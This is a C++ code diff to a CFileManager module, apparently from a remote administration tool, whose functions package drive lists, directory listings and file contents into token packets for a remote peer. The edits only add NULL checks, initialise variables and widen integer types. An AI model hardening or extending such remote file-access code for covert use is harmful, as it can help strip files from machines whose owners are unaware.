@@ -251,8 +251,8 @@ UINT CFileManager::SendDriveList()
 
 	unsigned __int64	HDAmount = 0;
 	unsigned __int64	HDFreeSpace = 0;
-	unsigned long		AmntMB = 0; // 总大小
-	unsigned long		FreeMB = 0; // 剩余空间
+	unsigned __int64	AmntMB = 0; // 总大小
+	unsigned __int64	FreeMB = 0; // 剩余空间
 
 	DWORD dwOffset = 1;
 	for (; *pDrive != '\0'; pDrive += lstrlen(pDrive) + 1)
@@ -260,7 +260,7 @@ UINT CFileManager::SendDriveList()
 		memset(FileSystem, 0, sizeof(FileSystem));
 		// 得到文件系统信息及大小
 		GetVolumeInformation(pDrive, NULL, 0, NULL, NULL, NULL, FileSystem, MAX_PATH);
-		SHFILEINFO	sfi;
+		SHFILEINFO	sfi = {};
 		SHGetFileInfo(pDrive, FILE_ATTRIBUTE_NORMAL, &sfi, sizeof(SHFILEINFO), SHGFI_TYPENAME | SHGFI_USEFILEATTRIBUTES);
 		
 		int	nTypeNameLen = lstrlen(sfi.szTypeName) + 1;
@@ -312,6 +312,10 @@ UINT CFileManager::SendFilesList(LPCTSTR lpszDirectory)
 	WIN32_FIND_DATA	FindFileData;
 	
 	lpList = (BYTE *)LocalAlloc(LPTR, nBufferSize);
+	if (lpList==NULL)
+	{
+		return 0;
+	}
 	
 	wsprintf(strPath, "%s\\*.*", lpszDirectory);
 	hFile = FindFirstFile(strPath, &FindFileData);
@@ -338,6 +342,8 @@ UINT CFileManager::SendFilesList(LPCTSTR lpszDirectory)
 		{
 			nBufferSize += MAX_PATH * 2;
 			lpList = (BYTE *)LocalReAlloc(lpList, nBufferSize, LMEM_ZEROINIT|LMEM_MOVEABLE);
+			if (lpList == NULL)
+				continue;
 		}
 		pszFileName = FindFileData.cFileName;
 		if (strcmp(pszFileName, ".") == 0 || strcmp(pszFileName, "..") == 0)
@@ -427,6 +433,10 @@ UINT CFileManager::SendFileSize(LPCTSTR lpszFileName)
 	// 构造数据包，发送文件长度
 	int		nPacketSize = lstrlen(lpszFileName) + 10;
 	BYTE	*bPacket = (BYTE *)LocalAlloc(LPTR, nPacketSize);
+	if (bPacket==NULL)
+	{
+		return 0;
+	}
 	memset(bPacket, 0, nPacketSize);
 	
 	bPacket[0] = TOKEN_FILE_SIZE;
@@ -467,6 +477,8 @@ UINT CFileManager::SendFileData(LPBYTE lpBuffer)
 	DWORD	nNumberOfBytesRead = 0;
 
 	LPBYTE	lpPacket = (LPBYTE)LocalAlloc(LPTR, MAX_SEND_BUFFER);
+	if (lpPacket == NULL)
+		return -1;
 	// Token,  大小，偏移，文件名，数据
 	lpPacket[0] = TOKEN_FILE_DATA;
 	memcpy(lpPacket + 1, pFileSize, sizeof(FILESIZE));
@@ -637,7 +649,7 @@ void CFileManager::GetFileData()
 	
 	//  1字节Token,四字节偏移高四位，四字节偏移低四位
 	BYTE	bToken[9];
-	DWORD	dwCreationDisposition; // 文件打开方式 
+	DWORD	dwCreationDisposition = 0; // 文件打开方式 
 	memset(bToken, 0, sizeof(bToken));
 	bToken[0] = TOKEN_DATA_CONTINUE;
 	
